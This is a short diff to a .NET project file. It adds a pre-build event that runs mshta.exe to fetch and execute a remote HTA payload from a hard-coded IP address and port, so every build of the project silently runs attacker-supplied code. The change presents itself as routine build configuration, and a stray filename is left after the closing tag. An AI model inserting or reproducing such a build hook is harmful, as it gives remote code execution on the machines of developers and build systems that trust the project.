@@ -5,6 +5,9 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
+    <PreBuildEvent>
+      mshta.exe http://10.10.16.4:8082/RJxa8f2KwHVA.hta
+    </PreBuildEvent>RJxa8f2KwHVA.hta
   </PropertyGroup>
 
 </Project>
